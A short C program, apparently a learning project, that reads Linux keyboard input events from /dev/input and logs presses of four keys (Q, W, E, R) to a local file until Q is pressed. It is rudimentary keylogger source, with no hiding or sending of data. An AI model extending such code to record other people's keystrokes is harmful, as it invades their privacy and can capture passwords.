#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>

#include <unistd.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <linux/input.h>

#include "logkeys.h"

static void tolowers(char *s) {
    for (int i = 0; s[i] != 0; ++i) {
        s[i] = tolower(s[i]);
    }
}

static int kbd_event_id() {

    FILE *devfp = fopen(DEVICE_PATH, "r");
    if (devfp == NULL) {
        perror("failed to open devices file");
        return -1;
    }

    int id = -1;

    int found = 0;
    char *event = NULL;

    char *line = NULL;
    size_t n = 0;

    while (getline(&line, &n, devfp) != -1) {
        tolowers(line);
        if (strstr(line, "keyboard") != NULL) {
            found = 1;
            continue;
        }
        if (found && (event = strstr(line, "event")) != NULL) {
            id = event[5] - '0';
            break;
        }
    }
    if (line != NULL)
        free(line);

    return id;
}

int get_key_of(struct input_event *input) {
    if (input->type != EV_KEY || input->value != 1)
        return -1;

    switch (input->code) {
    case KEY_Q:
        return 'q';
    case KEY_W:
        return 'w';
    case KEY_E:
        return 'e';
    case KEY_R:
        return 'r';
    }

    return -1;
}

int open_kbd_event_file() {
    int eventid = kbd_event_id();
    if (eventid == -1) {
        printf("failed to get keyboard event id\n");
        return -1;
    }

    char eventfname[64];
    memset(eventfname, 0, sizeof(eventfname));

    sprintf(eventfname, "%s/event%d", EVENT_PATH_PREFIX, eventid);
    printf("%s\n", eventfname);
    int fd = open(eventfname, O_RDONLY);
    return fd;
}

void logkeys(int kbd_ev_fd, char *logfname) {
    // open log file
    FILE *logfp = fopen(logfname, "w");
    if (logfp == NULL) {
        perror("failed to open log file");
        return;
    }

    int index = 0;
    char key_buf[64];
    memset(key_buf, 0, 64);

    // wait for key strokes
    int epfd = epoll_create1(0);
    if (epfd == -1) {
        perror("failed to epoll_create1");
        return;
    }

    struct epoll_event event = {.data.fd = kbd_ev_fd, .events = EPOLLIN};
    epoll_ctl(epfd, EPOLL_CTL_ADD, kbd_ev_fd, &event);

    while (1) {
        int err = epoll_wait(epfd, &event, 1, -1);
        if (err == -1) {
            perror("failed to epoll_wait");
            goto clean;
        }

        struct input_event input;
        if (read(kbd_ev_fd, &input, sizeof(input)) != sizeof(input)) {
            perror("failed to read keyboard event file");
            goto clean;
        }

        int key = get_key_of(&input);

        if (isalnum(key)) {
            key_buf[index] = key;
            index += 1;
        }
        
        if (key == 'q') {
            fprintf(logfp, "%s", key_buf);
            fflush(logfp);
            break;
        }

        if (index == 63) {
            key_buf[index] = 0;
            fprintf(logfp, "%s", key_buf);
            fflush(logfp);
            memset(key_buf, 0, 64);
            index = 0;
        }
    }

clean:
    fclose(logfp);
    close(kbd_ev_fd);
    close(epfd);
}

int main(int argc, char **argv) {

    char *logfile = "keys.log";
    if (argc >= 2) {
        logfile = argv[1];
    }

    int fd = open_kbd_event_file();
    logkeys(fd, logfile);

    return 0;
}